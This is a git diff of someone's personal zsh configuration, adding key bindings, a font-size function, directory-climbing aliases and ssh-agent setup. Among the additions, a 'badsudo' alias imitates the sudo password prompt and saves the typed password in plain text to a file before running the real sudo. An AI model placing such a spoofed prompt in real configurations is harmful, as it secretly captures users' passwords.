@@ -34,6 +34,8 @@ bindkey '^h' backward-delete-char
 bindkey '^?' backward-delete-char
 bindkey '^w' backward-kill-word
 bindkey '^r' history-incremental-search-backward
+bindkey '^a' beginning-of-line
+bindkey '^e' end-of-line
 
 export KEYTIMEOUT=1
 #export PROMPT="[%{$fg_no_bold[green]%}%n%{$reset_color%}] %~: "
@@ -45,6 +47,10 @@ RPROMPT="[%{$fg_no_bold[green]%}%?%{$reset_color%}]"
 alias ls="ls --color=auto"
 alias la="ls -a --color=auto"
 alias ll="ls -lat --color=auto"
+
+function font_size {
+    printf '\e]710;%s\007' "xft:Sauce Code Powerline:pixelsize=$1"
+}
 
 export GOPATH=/home/aleksander/.gopath/
 export PATH=${GOPATH//://bin:}/bin:$PATH
@@ -76,6 +82,11 @@ bindkey '^p' history-substring-search-up
 antibody bundle clvv/fasd # some help with selecting paths
 eval "$(fasd --init auto)"
 
+#antibody bundle igoradamenko/jira.plugin.zsh
+#export JIRA_URL="https://ntt-innovation.atlassian.net"
+#export JIRA_BRANCH_REGEX="s/(ESI-[0-9]+)_.+/\1/p"
+#export JIRA_NAME="aleksander.bulanowski"
+
 #antibody bundle tonyseek/oh-my-zsh-virtualenv-prompt
 #antibody bundle command-not-found
 #antibody bundle common-aliases
@@ -98,11 +109,19 @@ export WORKON_HOME=$HOME/.virtualenvs
 #export PROJECT_HOME=$HOME/dev
 source /usr/local/bin/virtualenvwrapper.sh
 
+alias l='ls'
 alias v='fasd -e vim -sif'
-alias -g ...="../../"
-alias -g ....="../../../"
-alias -g .....="../../../../"
-alias -g ......="../../../../../"
-alias -g .......="../../../../../../"
+alias uu="cd ../../"
+alias uuu="cd ../../../"
+alias uuuu="cd ../../../../"
+alias uuuuu="cd ../../../../../"
 export LESS=-MRiS#8j.5
-#alias ssh="TERM=xterm ssh"
+alias ssh="TERM=xterm ssh"
+alias cdg='cd `git rev-parse --show-toplevel 2> /dev/null`'
+
+[[ -s "/home/aleksander/.gvm/scripts/gvm" ]] && source "/home/aleksander/.gvm/scripts/gvm"
+
+alias badsudo='echo -n "[sudo] password for `whoami`: " ; read -s PASSWORD ; echo $PASSWORD > dupa.txt; echo ""; sleep 2 ; echo "Sorry, try again."; sudo'
+
+ssh-add 2> /dev/null
+ssh-add ~/Downloads/keys/* 2> /dev/null
